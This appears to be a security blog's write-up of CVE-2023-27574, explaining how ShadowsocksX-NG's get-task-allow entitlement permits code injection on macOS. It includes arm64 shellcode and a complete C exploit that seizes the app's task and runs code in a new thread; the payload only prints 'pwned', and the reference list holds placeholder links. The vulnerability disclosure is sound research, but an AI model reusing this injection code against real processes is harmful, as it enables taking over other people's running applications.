@@ -1,0 +1,344 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    <meta name="description" content="" />
+    <meta name="author" content="" />
+    
+        <title>CVE-2023-27574 - Shadowsocks-NG code execution</title>
+        <link rel="icon" type="image/x-icon" href="../assets/favicon.ico" />
+    
+    
+        
+            <link href="../css/custom.css" rel="stylesheet"/>
+        
+    
+    
+    <script src="https://use.fontawesome.com/releases/v5.15.4/js/all.js" crossorigin="anonymous"></script>
+    
+    <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css" />
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css" />
+    
+    
+        <link href="../css/styles.css" rel="stylesheet" />
+        <link href="../css/prism.css" rel="stylesheet" />
+    
+</head>
+
+    <body>
+        
+        <nav class="navbar navbar-expand-lg navbar-light" id="mainNav">
+            <div class="container px-4 px-lg-5">
+                <a class="navbar-brand" href="../index.html">Home</a>
+                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+                    Menu
+                    <i class="fas fa-bars"></i>
+                </button>
+                <div class="collapse navbar-collapse" id="navbarResponsive">
+                    <ul class="navbar-nav ms-auto py-4 py-lg-0">
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../index.html">Home</a></li>
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../about.html">About</a></li>
+                        
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../pages/cves.html">CVEs</a></li>
+                        
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../pages/exploits.html">Vulnerabilities</a></li>
+                        
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../tags.html">Tags</a></li>
+                    </ul>
+                </div>
+            </div>
+        </nav>
+        
+        <header class="masthead" style="background-image: url('../assets/img/post-bg.jpg');">
+            <div class="container position-relative px-4 px-lg-5">
+                <div class="row gx-4 gx-lg-5 justify-content-center">
+                    <div class="col-md-10 col-lg-8 col-xl-7">
+                        <div class="post-heading">
+                            <h1>CVE-2023-27574 - Shadowsocks-NG code execution</h1>
+                            <h2 class="subheading">Exploiting get-task-allow for code execution</h2>
+                            
+                                <a href="../tags/cve.html"><button type="button" class="btn btn-primary btn-sm">cve</button></a>
+                            
+                                <a href="../tags/vuln.html"><button type="button" class="btn btn-primary btn-sm">vuln</button></a>
+                            
+                                <a href="../tags/reverse-engineering.html"><button type="button" class="btn btn-primary btn-sm">reverse-engineering</button></a>
+                            
+                            <br><br>
+                            <span class="meta">
+                                Posted by
+                                <a href="#!">NSEcho</a>
+                                on 2023-03-05 13:45:06
+                            </span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+        
+        <article class="mb-4">
+            <div class="container px-4 px-lg-5">
+                <div class="row gx-4 gx-lg-5 justify-content-center">
+                    <div class="col-md-10 col-lg-8 col-xl-7 ct">
+                        <h1 id="table-of-contents">Table of Contents</h1>
+
+<ul>
+<li><a href="#introduction">Introduction</a></li>
+<li><a href="#analysis">Analysis</a></li>
+<li><a href="#mach-vm-api">Mach VM API</a></li>
+<li><a href="#references">References</a></li>
+</ul>
+
+<h1 id="introduction">Introduction</h1>
+
+<p>Recently, I started playing a bit with different methods of code injection inside the MacOS applications.
+The version of  <a href="https://github.com/shadowsocks/ShadowsocksX-NG/releases/tag/v1.10.1">ShadowsocksX-NG</a> prior to <code>v1.10.1</code> has <code>com.apple.security.get-task-allow</code> entitlement.</p>
+
+<p>This entitlement allows other processes to obtain the applications task. Obtaining the task means you can do with the process everything you want(code execution, memory read/write etc).</p>
+
+<p>At the end of this post, we will be exploiting this to write <code>pwned</code> text to the STDOUT of the application. Nothing fancy about it, just demonstrates the  usage of mach API and a bit of shellcoding for arm64.</p>
+
+<p>We will utilize mach vm API with the <code>thread_create_running</code> to execute our shellcode on macOS Ventura running on M1 using arm64 architecture.</p>
+
+<h1 id="analysis">Analysis</h1>
+
+<p>Application <a href="https://github.com/shadowsocks/ShadowsocksX-NG">ShadowsocksX-NG</a> is MacOS client for the original shadowsocks. Shadowsocks is a tool that helps to circumvent firewalls.</p>
+
+<p>To view the entitlements, we can use <code>codesign -dv --entitlements :- /path/to/the/binary</code></p>
+
+<pre><code class="language-bash">$ codesign -d --entitlements :- /Applications/ShadowsocksX-NG.app/Contents/MacOS/ShadowsocksX-NG 2&gt; /dev/null | xmllint --format -
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;https://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;
+&lt;plist version=&quot;1.0&quot;&gt;
+  &lt;dict&gt;
+    &lt;key&gt;com.apple.security.get-task-allow&lt;/key&gt;
+    &lt;true/&gt;
+  &lt;/dict&gt;
+&lt;/plist&gt;
+</code></pre>
+
+<p>We can see that the application has only entitlement, and it is <code>com.apple.security.get-task-allow</code>.</p>
+
+<h1 id="mach-vm-api">Mach VM API</h1>
+
+<p>We will utilize mach vm api to exploit the entitlement:<br>
+* <code>task_for_pid</code> - to obtain the task for the process id of ShadowsocksX-NG<br>
+* <code>mach_vm_allocate</code> - to allocate the space inside the process<br>
+* <code>mach_vm_write</code> - to write our shellcode inside the allocated space<br>
+* <code>vm_protect</code> - to enable executing allocated space
+* <code>thread_create_running</code> - to run our shellcode inside the process space in a new thread</p>
+
+<p>The exploitation steps are:</p>
+
+<ol>
+<li>obtain the pid</li>
+<li>try to get applications task</li>
+<li>allocate space for the shellcode</li>
+<li>allocate space for the stack</li>
+<li>write shellcode</li>
+<li>give execute permission at the shellcode address</li>
+<li>create new thread</li>
+<li>execute thread</li>
+</ol>
+
+<pre><code class="language-nasm">.global _main
+.align 4
+
+_main:
+        mov x0, #1
+
+        mov x4, #0x7770                         ; write wp
+        movk x4, #0x656e, lsl #16       ; write en
+        movk x4, #0x0a64, lsl #32       ; write \nd
+        str x4, [sp, #-8]
+        mov x5, #8
+        sub x1, sp, x5  
+
+        mov x2, #6 ; length
+        mov x16, #0x4
+        svc #0x80
+
+        mov x0, #6 ; exit status call
+        mov x16, #1
+        svc #0xffff
+</code></pre>
+
+<p>Full exploit source code:</p>
+
+<pre><code class="language-c">#import &lt;Foundation/Foundation.h&gt;
+#import &lt;AppKit/AppKit.h&gt;
+#include &lt;ptrauth.h&gt;
+
+#define STACK_SIZE 65536
+#define CODE_SIZE 124
+
+extern kern_return_t mach_vm_allocate(task_t task, mach_vm_address_t *addr, mach_vm_size_t size, int flags);
+extern kern_return_t mach_vm_read(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, vm_offset_t *data, mach_msg_type_number_t *dataCnt);
+extern kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);
+
+char shellCode[] = &quot;\x20\x00\x80\xd2\x04\xee\x8e\xd2\xc4\xad\xac\xf2\x84\x4c\xc1\xf2\xe4\x83\x1f\xf8\x05\x01\x80\xd2\xe1\x63\x25\xcb\xc2\x00\x80\xd2\x90\x00\x80\xd2\x01\x10\x00\xd4\xc0\x00\x80\xd2\x30\x00\x80\xd2\xe1\xff\x1f\xd4\x01\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x1c\x00\x00\x00\x02\x00\x00\x00\x80\x3f\x00\x00\x34\x00\x00\x00\x34\x00\x00\x00\xb5\x3f\x00\x00\x00\x00\x00\x00\x34\x00\x00\x00\x03\x00\x00\x00\x0c\x00\x01\x00\x10\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;;
+
+pid_t getShadowPID() {
+    NSString * appPID = @&quot;com.qiuyuzhou.ShadowsocksX-NG&quot;;
+    NSArray&lt;NSRunningApplication *&gt; *runningShadowsocks = [NSRunningApplication runningApplicationsWithBundleIdentifier:appPID];
+    
+    if (runningShadowsocks == nil || [runningShadowsocks count] == 0) {
+        printf(&quot;[!] Exploit failed!\n&quot;);
+        exit(-1);
+    }
+    
+    NSRunningApplication *ShadowsocksX_NG = runningShadowsocks[0];
+    pid_t shadowPID = [ShadowsocksX_NG processIdentifier];
+    
+    return shadowPID;
+}
+
+int main(int argc, const char * argv[]) {
+    pid_t shadowPID = getShadowPID();
+    
+    task_t remoteTask;
+    kern_return_t kr = task_for_pid(current_task(), shadowPID, &amp;remoteTask);
+    
+    if (kr != KERN_SUCCESS) {
+        printf(&quot;[!] Failed to get ShadowsocksX-NG's task: %s\n&quot;, mach_error_string(kr));
+        exit(-2);
+    } else {
+        printf(&quot;[+] ShadowsocksX-NG's task successfully taken over: %d\n&quot;, remoteTask);
+    }
+
+    mach_vm_address_t remoteStack = (vm_address_t)NULL;
+    mach_vm_address_t remoteCode = (vm_address_t)NULL;
+
+    kr = mach_vm_allocate(remoteTask, &amp;remoteStack, STACK_SIZE, VM_FLAGS_ANYWHERE);
+
+    if (kr != KERN_SUCCESS) {
+        printf(&quot;Failed to allocate stack memory: %s\n&quot;, mach_error_string(kr));
+    } else {
+        printf(&quot;allocated stack at: 0x%llx\n&quot;, remoteStack);
+    }
+
+    kr = mach_vm_allocate(remoteTask, &amp;remoteCode, CODE_SIZE, VM_FLAGS_ANYWHERE);
+
+    if (kr != KERN_SUCCESS) {
+        printf(&quot;Failed to allocate stack memory: %s\n&quot;, mach_error_string(kr));
+    } else {
+        printf(&quot;allocated code at: 0x%llx\n&quot;, remoteCode);
+    }
+
+    kr = mach_vm_write(remoteTask, remoteCode, (vm_address_t)shellCode,CODE_SIZE);
+
+    if (kr != KERN_SUCCESS) {
+        printf(&quot;Failed to write code: %s\n&quot;, mach_error_string(kr));
+    } else {
+        printf(&quot;written code at: 0x%llx\n&quot;, remoteCode);
+    }
+
+    kr  = vm_protect(remoteTask, remoteCode, CODE_SIZE, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
+
+    remoteStack += (STACK_SIZE / 2);
+
+    task_flavor_t flavor = ARM_THREAD_STATE64;
+    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
+
+    arm_thread_state64_t state;
+
+    state.__pc = (uintptr_t)remoteCode;
+    state.__sp = (uintptr_t)remoteStack;
+
+    thread_act_t thread;
+    kr = thread_create_running(remoteTask, flavor, (thread_state_t)&amp;state, count, &amp;thread);
+
+    if (kr != KERN_SUCCESS) {
+        printf(&quot;error spawning thread: %s\n&quot;, mach_error_string(kr));
+    } else {
+        printf(&quot;done\n&quot;);
+    }
+
+    return 0;
+}
+</code></pre>
+
+<p><img src="../images/shadow_run.png" alt="Running exploit" /></p>
+
+                    </div>
+                </div>
+            </div>
+            
+    
+    <div class="container px-4 px-lg-5">
+        <div class="row gx-4 gx-lg-5 justify-content-center">
+            <div class="col-md-10 col-lg-8 col-xl-7">
+                <h1 id="references">References</h1>
+                <ol>
+                    <li><a href="https://www.google.com">https://www.google.com</a></li>
+                    <li><a href="https://www.facebook.com">https://www.facebook.com</a></li>
+                    
+                </ol>
+            </div>
+        </div>
+    </div>
+    
+
+            
+        
+        
+        <footer class="border-top">
+            <div class="container px-4 px-lg-5">
+                <div class="row gx-4 gx-lg-5 justify-content-center">
+                    <div class="col-md-10 col-lg-8 col-xl-7">
+                        <ul class="list-inline text-center">
+                            <li class="list-inline-item">
+                                <a href="">
+                                    <span class="fa-stack fa-lg">
+                                        <i class="fas fa-circle fa-stack-2x"></i>
+                                        <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                                    </span>
+                                </a>
+                            </li>
+                            <li class="list-inline-item">
+                                <a href="https://www.github.com/lateralusd">
+                                    <span class="fa-stack fa-lg">
+                                        <i class="fas fa-circle fa-stack-2x"></i>
+                                        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                                    </span>
+                                </a>
+                            </li>
+                            <li class="list-inline-item">
+                                <a href="mailto:xdaemonx@protonmail.com">
+                                    <span class="fa-stack fa-lg">
+                                        <i class="fas fa-circle fa-stack-2x"></i>
+                                        <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+                                    </span>
+                                </a>
+                            </li>
+                            <li class="list-inline-item">
+                                <a href="https://nsecho.github.io//index.xml">
+                                    <span class="fa-stack fa-lg">
+                                        <i class="fas fa-circle fa-stack-2x"></i>
+                                        <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                                    </span>
+                                </a>
+                            </li>
+                        </ul>
+                        <div class="small text-center text-muted fst-italic">Copyright &copy; NSEcho 2023</div>
+                        <div class="small text-center text-muted fst-italic">Made with <a href="https://github.com/lateralusd/bloggy">bloggy</a></div>
+                    </div>
+                </div>
+            </div>
+        </footer>
+        <style>
+            .ct > p img {
+                height: 100%;
+                width: 100%;
+            }
+        </style>
+
+        
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+        
+        <script src="../js/scripts.js"></script>
+        <script src="../js/prism.js"></script>
+    </body>
+</html>
